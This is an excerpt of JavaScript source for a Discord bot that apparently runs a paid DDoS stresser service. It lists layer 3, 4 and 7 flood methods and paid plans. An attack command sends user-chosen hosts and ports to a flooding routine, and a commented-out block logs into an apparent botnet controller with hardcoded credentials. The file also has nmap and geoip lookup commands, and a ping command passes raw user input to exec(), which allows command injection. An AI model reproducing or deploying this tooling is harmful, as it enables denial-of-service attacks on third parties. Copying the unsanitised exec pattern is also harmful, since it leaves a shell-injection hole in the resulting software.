...
//methods
client.on('message', (msg) => {
  if (msg.content === `${config.prefix}methods`) {
    const embed = new discord.MessageEmbed().setTitle('Methods').setDescription('\r\n\r\nLayer3 Methods: ICMP\r\n\r\nLayer4 Methods: UDP, UDP-RAW, XMAS, SYN, ACK, ADV, STD, DNS\r\n\r\nLayer7 Methods: HTTP-PPS, HTTP-GHP\r\n\r\n').setColor('#CF9B10'); msg.channel.send(embed);
  }
});
//plans
client.on('message', (msg) => {
  if (msg.content === `${config.prefix}plans`) {
    const embed = new discord.MessageEmbed().setTitle('Paid Plans')
...
//attack
client.on('message', (msg) => {
  if (msg.content.startsWith(`${config.prefix}attack`)) {
    /*
    if (msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
    if (!msg.member.roles.cache.has(config.normal) && !msg.member.roles.cache.has(config.premium)) { msg.channel.send(Warn('You dont have permissions!')); return; }
    ...
    if (Number(args[1]) < config.mintime) { msg.channel.send(Warn('Min time is ' + config.mintime + ' seconds!')); return; }
    if (msg.member.roles.cache.has(config.normal)) {
      if (Number(args[1]) > config.maxtime) { msg.channel.send(Warn('Max time is 200 seconds!')); return; }
    }
    else if (msg.member.roles.cache.has(config.premium)) {
      if (Number(args[1]) > config.maxtime) { msg.channel.send(Warn('Max time is 300 seconds!')); return; }
    }
    else { msg.channel.send(Warn('You dont have permissions!')); return; }
    let port = args[2]
    let host = args[0]
    let s = socket.createConnection(port, host);
    console.log(s)
    s.write(' \r\n'); sleep.sleep(3); //leave this
    s.write('krawk\r\n'); sleep.sleep(3); //user
    s.write('123\r\n'); sleep.sleep(3); //pass
    s.write(''); sleep.sleep(9); //command
    s.end();
    */
    if (msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
    if (!msg.member.roles.cache.has(config.normal) && !msg.member.roles.cache.has(config.premium)) { msg.channel.send(Warn('You dont have permissions!')); return; }
    const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    if (!args) return msg.reply('Envie o comando corretamente!')
    let server = args[0]
    let port = args[1]
    let stress = new Stress()
    stress.run(server, port)
    
  }
});
//nmap
client.on('message', (msg) => {
  if (msg.content.startsWith(`${config.prefix}nmap`)) {
    if (msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
    if (!msg.member.roles.cache.has(config.normal) && !msg.member.roles.cache.has(config.premium)) { msg.channel.send(Warn('You dont have permissions!')); return; }
    const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    ...
    axios.get(`https://api.hackertarget.com/nmap/?q=${args[1]}`).then(response => {
      ...
      const embed = new discord.MessageEmbed().setTitle('Nmap').setDescription(`\r\n\r\n${strfinished}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed);
    });
  }
});
//geoip
client.on('message', (msg) => {
  if (msg.content.startsWith(`${config.prefix}geoip`)) {
    if (msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
    if (!msg.member.roles.cache.has(config.normal) && !msg.member.roles.cache.has(config.premium)) { msg.channel.send(Warn('You dont have permissions!')); return; }
    const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    if (args.length < 1 || args[1].length > 15 || args[1].length < 7 || isLetter(args[1])) { msg.channel.send(Warn('Something is wrong!')); return; }
    ...
    axios.get(`http://ip-api.com/json/${args[1]}`).then(response => {
      ...
      const embed = new discord.MessageEmbed().setTitle('Geo Location').setDescription(`\r\n\r\n${strfinished2}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed);
    });
  }
});
//ping
client.on('message', (msg) => {
  if (msg.content.startsWith(`${config.prefix}ping`)) {
    ...
    exec(`ping ${args[1]}`, (err, stdout, stderr) => {
      ...
      const embed = new discord.MessageEmbed().setTitle('Ping').setDescription(`\r\n\r\n${strfinished}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed);
    });
  }
});
